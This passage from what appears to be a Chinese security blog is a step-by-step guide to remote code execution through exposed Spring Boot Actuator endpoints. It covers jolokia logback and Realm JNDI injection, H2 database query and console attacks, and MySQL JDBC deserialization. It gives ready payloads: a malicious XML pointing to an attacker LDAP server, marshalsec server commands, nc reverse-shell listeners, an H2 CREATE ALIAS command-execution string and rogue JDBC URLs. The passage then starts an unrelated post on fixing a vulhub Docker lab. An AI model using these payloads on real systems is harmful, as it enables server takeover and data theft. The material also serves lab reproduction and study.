  <li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li>
  <li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-2">漏洞分析：</h4>

<p>​	<a href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p>

<h4 id="漏洞环境-2">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce">repository/springboot-eureka-xstream-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9093/env
</code></pre></div></div>

<h3 id="0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</h3>

<h4 id="利用条件-7">利用条件：</h4>

<ul>
  <li>目标网站存在 <code class="language-plaintext highlighter-rouge">/jolokia</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/jolokia</code> 接口</li>
  <li>目标使用了 <code class="language-plaintext highlighter-rouge">jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
  <li>
    <p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
  </li>
  <li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li>
</ul>

<h4 id="利用方法-7">利用方法：</h4>

<h5 id="步骤一查看已存在的-mbeans">步骤一：查看已存在的 MBeans</h5>

<p>访问 <code class="language-plaintext highlighter-rouge">/jolokia/list</code> 接口，查看是否存在 <code class="language-plaintext highlighter-rouge">ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code class="language-plaintext highlighter-rouge">reloadByURL</code> 关键词。</p>

<h5 id="步骤二托管-xml-文件">步骤二：托管 xml 文件</h5>

<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>

python2 <span class="nt">-m</span> SimpleHTTPServer 80
python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>在根目录放置以 <code class="language-plaintext highlighter-rouge">xml</code> 结尾的 <code class="language-plaintext highlighter-rouge">example.xml</code>  文件，内容如下：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;configuration&gt;</span>
  <span class="nt">&lt;insertFromJNDI</span> <span class="na">env-entry-name=</span><span class="s">"ldap://your-vps-ip:1389/JNDIObject"</span> <span class="na">as=</span><span class="s">"appName"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/configuration&gt;</span>
</code></pre></div></div>

<h5 id="步骤三准备要执行的-java-代码">步骤三：准备要执行的 Java 代码</h5>

<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code class="language-plaintext highlighter-rouge">JNDIObject.java</code>，</p>

<p>使用兼容低版本 jdk 的方式编译：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac <span class="nt">-source</span> 1.5 <span class="nt">-target</span> 1.5 JNDIObject.java
</code></pre></div></div>

<p>然后将生成的 <code class="language-plaintext highlighter-rouge">JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>

<h5 id="步骤四架设恶意-ldap-服务">步骤四：架设恶意 ldap 服务</h5>

<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
</code></pre></div></div>

<h5 id="步骤五监听反弹-shell-的端口">步骤五：监听反弹 shell 的端口</h5>

<p>一般使用 nc 监听端口，等待反弹 shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lv</span> 443
</code></pre></div></div>

<h5 id="步骤六从外部-url-地址加载日志配置文件">步骤六：从外部 URL 地址加载日志配置文件</h5>

<blockquote>
  <p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p>
</blockquote>

<p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
</code></pre></div></div>

<h4 id="漏洞原理-3">漏洞原理：</h4>

<ol>
  <li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code class="language-plaintext highlighter-rouge">ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code class="language-plaintext highlighter-rouge">reloadByURL</code> 方法</li>
  <li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li>
  <li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
  <li>xml 文件中利用 <code class="language-plaintext highlighter-rouge">logback</code> 依赖的 <code class="language-plaintext highlighter-rouge">insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
  <li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-3">漏洞分析：</h4>

<p>​	<a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p>

<h4 id="漏洞环境-3">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository/springboot-jolokia-logback-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9094/env
</code></pre></div></div>

<h3 id="0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</h3>

<h4 id="利用条件-8">利用条件：</h4>

<ul>
  <li>目标网站存在 <code class="language-plaintext highlighter-rouge">/jolokia</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/jolokia</code> 接口</li>
  <li>目标使用了 <code class="language-plaintext highlighter-rouge">jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
  <li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121（RMI 方式）</li>
</ul>

<h4 id="利用方法-8">利用方法：</h4>

<h5 id="步骤一查看已存在的-mbeans-1">步骤一：查看已存在的 MBeans</h5>

<p>访问 <code class="language-plaintext highlighter-rouge">/jolokia/list</code> 接口，查看是否存在 <code class="language-plaintext highlighter-rouge">type=MBeanFactory</code> 和 <code class="language-plaintext highlighter-rouge">createJNDIRealm</code> 关键词。</p>

<h5 id="步骤二准备要执行的-java-代码">步骤二：准备要执行的 Java 代码</h5>

<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code class="language-plaintext highlighter-rouge">JNDIObject.java</code>。</p>

<h5 id="步骤三托管-class-文件">步骤三：托管 class 文件</h5>

<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>

python2 <span class="nt">-m</span> SimpleHTTPServer 80
python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>

<h5 id="步骤四架设恶意-rmi-服务">步骤四：架设恶意 rmi 服务</h5>

<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
</code></pre></div></div>

<h5 id="步骤五监听反弹-shell-的端口-1">步骤五：监听反弹 shell 的端口</h5>

<p>一般使用 nc 监听端口，等待反弹 shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 443
</code></pre></div></div>

<h5 id="步骤六发送恶意-payload">步骤六：发送恶意 payload</h5>

<p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p>

<h4 id="漏洞原理-4">漏洞原理：</h4>

<ol>
  <li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li>
  <li>设置 connectionURL 地址为 RMI Service URL</li>
  <li>设置 contextFactory 为 RegistryContextFactory</li>
  <li>停止 Realm</li>
  <li>启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-4">漏洞分析：</h4>

<p>​	<a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p>

<h4 id="漏洞环境-4">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository/springboot-jolokia-logback-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9094/env
</code></pre></div></div>

<h3 id="0x06h2-database-query-rce">0x06：h2 database query RCE</h3>

<h4 id="利用条件-9">利用条件：</h4>

<ul>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/restart</code> 接口重启应用（存在 spring-boot-starter-actuator 依赖）</li>
  <li>存在 <code class="language-plaintext highlighter-rouge">com.h2database.h2</code> 依赖（版本要求暂未知）</li>
</ul>

<h4 id="利用方法-9">利用方法：</h4>

<h5 id="步骤一设置-springdatasourcehikariconnection-test-query-属性">步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h5>

<blockquote>
  <p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
</blockquote>

<p>spring 1.x（无回显执行命令）</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
</code></pre></div></div>

<p>spring 2.x（无回显执行命令）</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}
</code></pre></div></div>

<h5 id="步骤二重启应用">步骤二：重启应用</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /restart
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/restart
Content-Type: application/json

</code></pre></div></div>

<h4 id="漏洞原理-5">漏洞原理：</h4>

<ol>
  <li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code class="language-plaintext highlighter-rouge">CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
  <li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
  <li>restart 重启应用，会建立新的数据库连接</li>
  <li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-5">漏洞分析：</h4>

<p>​	<a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p>

<h4 id="漏洞环境-5">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository/springboot-h2-database-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9096/actuator/env
</code></pre></div></div>

<h3 id="0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</h3>

<h4 id="利用条件-10">利用条件：</h4>

<ul>
  <li>存在 <code class="language-plaintext highlighter-rouge">com.h2database.h2</code> 依赖（版本要求暂未知）</li>
  <li>spring 配置中启用 h2 console  <code class="language-plaintext highlighter-rouge">spring.h2.console.enabled=true</code></li>
  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
  <li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li>
</ul>

<h4 id="利用方法-10">利用方法：</h4>

<h5 id="步骤一访问路由获得-jsessionid">步骤一：访问路由获得 jsessionid</h5>

<p>直接访问目标开启 h2 console 的默认路由 <code class="language-plaintext highlighter-rouge">/h2-console</code>，目标会跳转到页面 <code class="language-plaintext highlighter-rouge">/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code class="language-plaintext highlighter-rouge">jsessionid=xxxxxx</code> 值。</p>

<h5 id="步骤二准备要执行的-java-代码-1">步骤二：准备要执行的 Java 代码</h5>

<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code class="language-plaintext highlighter-rouge">JNDIObject.java</code>，</p>

<p>使用兼容低版本 jdk 的方式编译：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac <span class="nt">-source</span> 1.5 <span class="nt">-target</span> 1.5 JNDIObject.java
</code></pre></div></div>

<p>然后将生成的 <code class="language-plaintext highlighter-rouge">JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>

<h5 id="步骤三托管-class-文件-1">步骤三：托管 class 文件</h5>

<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>

python2 <span class="nt">-m</span> SimpleHTTPServer 80
python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>

<h5 id="步骤四架设恶意-ldap-服务-1">步骤四：架设恶意 ldap 服务</h5>

<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
</code></pre></div></div>

<h5 id="步骤五监听反弹-shell-的端口-2">步骤五：监听反弹 shell 的端口</h5>

<p>一般使用 nc 监听端口，等待反弹 shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lv</span> 443
</code></pre></div></div>

<h5 id="步骤六发包触发-jndi-注入">步骤六：发包触发 JNDI 注入</h5>

<p>根据实际情况，替换下面数据中的 <code class="language-plaintext highlighter-rouge">jsessionid=xxxxxx</code>、<code class="language-plaintext highlighter-rouge">www.example.com</code> 和 <code class="language-plaintext highlighter-rouge">ldap://your-vps-ip:1389/JNDIObject</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /h2-console/login.do?jsessionid<span class="o">=</span>xxxxxx
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Referer: http://www.example.com/h2-console/login.jsp?jsessionid<span class="o">=</span>xxxxxx

<span class="nv">language</span><span class="o">=</span>en&amp;setting<span class="o">=</span>Generic+H2+%28Embedded%29&amp;name<span class="o">=</span>Generic+H2+%28Embedded%29&amp;driver<span class="o">=</span>javax.naming.InitialContext&amp;url<span class="o">=</span>ldap://your-vps-ip:1389/JNDIObject&amp;user<span class="o">=</span>&amp;password<span class="o">=</span>
</code></pre></div></div>

<h4 id="漏洞分析-6">漏洞分析：</h4>

<p>​	<a href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p>

<h4 id="漏洞环境-6">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository/springboot-h2-database-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9096/h2-console
</code></pre></div></div>

<h3 id="0x08mysql-jdbc-deserialization-rce">0x08：mysql jdbc deserialization RCE</h3>

<h4 id="利用条件-11">利用条件：</h4>

<ul>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
  <li>目标环境中存在 <code class="language-plaintext highlighter-rouge">mysql-connector-java</code> 依赖</li>
  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>

<h4 id="利用方法-11">利用方法：</h4>

<h5 id="步骤一查看环境依赖">步骤一：查看环境依赖</h5>

<p>GET 请求 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code>，搜索环境变量（classpath）中是否有 <code class="language-plaintext highlighter-rouge">mysql-connector-java</code>  关键词，并记录下其版本号（5.x 或 8.x）；</p>

<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  <code class="language-plaintext highlighter-rouge">commons-collections</code>、<code class="language-plaintext highlighter-rouge">Jdk7u21</code>、<code class="language-plaintext highlighter-rouge">Jdk8u20</code> 等；</p>

<p>搜索 <code class="language-plaintext highlighter-rouge">spring.datasource.url</code> 关键词，记录下其 <code class="language-plaintext highlighter-rouge">value</code>  值，方便后续恢复其正常 jdbc url 值。</p>

<h5 id="步骤二架设恶意-rogue-mysql-server">步骤二：架设恶意 rogue mysql server</h5>

<p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> ysoserial.jar CommonsCollections3 calc <span class="o">&gt;</span> payload.ser
</code></pre></div></div>

<p>在脚本<strong>同目录下</strong>生成 <code class="language-plaintext highlighter-rouge">payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>

<h5 id="步骤三设置-springdatasourceurl-属性">步骤三：设置 spring.datasource.url 属性</h5>

<blockquote>
  <p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
</blockquote>

<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
</code></pre></div></div>

<p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
</code></pre></div></div>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.url=对应属性值
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.url","value":"对应属性值"}
</code></pre></div></div>

<h5 id="步骤四刷新配置-1">步骤四：刷新配置</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
Content-Type: application/json

</code></pre></div></div>

<h5 id="步骤五触发数据库查询">步骤五：触发数据库查询</h5>

<p>尝试访问网站已知的数据库查询的接口，例如： <code class="language-plaintext highlighter-rouge">/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>

<h5 id="步骤六恢复正常-jdbc-url">步骤六：恢复正常 jdbc url</h5>

<p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code class="language-plaintext highlighter-rouge">spring.datasource.url</code> 的原始 <code class="language-plaintext highlighter-rouge">value</code> 值</p>

<h4 id="漏洞原理-6">漏洞原理：</h4>

<ol>
  <li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
  <li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
  <li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li>
  <li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li>
  <li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-7">漏洞分析：</h4>

<p>​	<a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p>

<h4 id="漏洞环境-7">漏洞环境：</h4>

<blockquote>
  <p>需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出</p>
</blockquote>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce">repository/springboot-mysql-jdbc-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9097/actuator/env
</code></pre></div></div>

<p>发送完 payload 后触发漏洞：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9097/product/list
</code></pre></div></div>


          <p><a href="/blog/2020/Spring-boot/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/docker/vuln/problems/"><h3 class="ctitle">「排错」：Docker启动vulnhub报错排错</h3></a>
          <p><csmall>Sep 11, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p>最近在做靶场漏洞复现的时候发现了一个由web虚拟机和db虚拟机一起跑起来的联动靶场环境，下载完镜像后总是报错，思前想后都没办法，于是只能自己来解决问题，虽然结果令人大失所望，但是过程还是挺让人有成就感的，就记录了一下。</p>

<h2 id="docker启服务">#docker启服务</h2>
<p>进入相对应的靶场环境文件夹下起靶场：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro CVE-2020-9402 % docker-compose up -d
Creating network "cve-2020-9402_default" with the default driver
Creating cve-2020-9402_db_1 ... done
Creating cve-2020-9402_web_1 ... done
bin4xin@bin4xin'</span>s MacbookPro CVE-2020-9402 % docker-compose ps
       Name                      Command               State              Ports            
<span class="nt">-------------------------------------------------------------------------------------------</span>
cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&gt;8000/tcp 
</code></pre></div></div>
<p>我们可以看到对应web服务的端口监听状态：<code class="language-plaintext highlighter-rouge">0.0.0.0:8000-&gt;8000/tcp</code>，所以我们直接访问试试看：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro CVE-2020-9402 % curl localhost:8000
curl: (52) Empty reply from server
bin4xin@bin4xin'</span>s MacbookPro CVE-2020-9402 % docker-compose ps  
       Name                      Command               State              Ports            
<span class="nt">-------------------------------------------------------------------------------------------</span>
cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&gt;8000/tcp 


bin4xin@bin4xin<span class="s1">'s MacbookPro CVE-2020-9402 % curl 127.0.0.1:8000/vuln
curl: (52) Empty reply from server
bin4xin@bin4xin'</span>s MacbookPro CVE-2020-9402 % docker-compose ps       
       Name                      Command               State              Ports            
<span class="nt">-------------------------------------------------------------------------------------------</span>
cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&gt;8000/tcp 
</code></pre></div></div>
<p>在上面的bash终端代码我们可以看到，我们访问8000端口服务，都是返回<code class="language-plaintext highlighter-rouge">Empty reply from server</code>，我就很郁闷了，明明docker显示状态是<code class="language-plaintext highlighter-rouge">Up</code>状态，怎么访问时服务返回空呢。</p>

<h2 id="排错">#排错</h2>

<h3 id="这是一个有脾气的容器">#这是一个有脾气的容器</h3>
<p>还是不甘心，看了一下本地的ip地址，再次访问看看：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro shiro % ifconfig|grep inet                                                  
	inet 127.0.0.1 netmask 0xff000000 
	inet6 ::1 prefixlen 128 
	inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1 
	inet6 fe80::aede:48ff:fe00:1122%en5 prefixlen 64 scopeid 0x7 
	inet6 fe80::146d:ed67:817a:e134%en0 prefixlen 64 secured scopeid 0x9 
	inet 114.97.221.67 netmask 0xfffffe00 broadcast 114.97.221.255
	inet6 fe80::24e6:3dff:fe1c:7c55%awdl0 prefixlen 64 scopeid 0x10 
	inet6 fe80::24e6:3dff:fe1c:7c55%llw0 prefixlen 64 scopeid 0x11 
	inet6 fe80::9a9a:9906:8f8d:5e0%utun0 prefixlen 64 scopeid 0x12 
	inet6 fe80::8ef2:d44b:f2b0:f37e%utun1 prefixlen 64 scopeid 0x13 

en0: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500
	inet 114.97.221.67

bin4xin@bin4xin'</span>s MacbookPro shiro % curl http://114.97.221.67:8000/vuln
curl: <span class="o">(</span>7<span class="o">)</span> Failed to connect to 114.97.221.67 port 8000: Connection refused

bin4xin@bin4xin<span class="s1">'s MacbookPro shiro % docker-compose ps                  
       Name                      Command                 State                 Ports            
------------------------------------------------------------------------------------------------
cve-2020-9402_db_1    /entrypoint.sh                   Up           1521/tcp, 5500/tcp, 8080/tcp
cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Restarting 
</span></code></pre></div></div>
<p>好家伙，这次直接web服务重启了，有脾气。没办法，直接把整个环境down掉重启。</p>

<h3 id="进容器">#进容器</h3>
<p>这次我想到的办法是直接进容器里面去看看服务到底发生了什么：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker ps

a66976bc6d2b        cve-2020-9402_web      <span class="s2">"/docker-entrypoint.…"</span>   4 seconds ago       Up 3 seconds        0.0.0.0:8000-&gt;8000/tcp         cve-2020-9402_web_1
fc99758ce428        vulhub/oracle:12c-ee   <span class="s2">"/entrypoint.sh"</span>         5 seconds ago       Up 3 seconds        1521/tcp, 5500/tcp, 8080/tcp   cve-2020-9402_db_1
</code></pre></div></div>
<p>我们可以通过<code class="language-plaintext highlighter-rouge">docker ps</code>来查看docker镜像<code class="language-plaintext highlighter-rouge">cve-2020-9402_web</code>对应的<code class="language-plaintext highlighter-rouge">CONTAINER ID</code>，通过这个id值进入容器；</p>
